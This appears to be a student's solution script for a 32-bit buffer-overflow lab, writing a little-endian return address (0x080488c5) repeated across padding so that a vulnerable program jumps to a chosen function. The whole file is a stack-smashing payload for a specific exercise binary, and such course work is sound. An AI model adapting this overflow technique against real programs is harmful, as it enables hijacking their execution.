#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
addr_good = 0x080488c5

pad = 4*4 # pad 16 byte

# payload = b'\x08\x04\x88\xc5'
payload = b'\xc5\x88\x04\x08'


sys.stdout.buffer.write(payload*pad)
sys.stdout.buffer.write(payload)
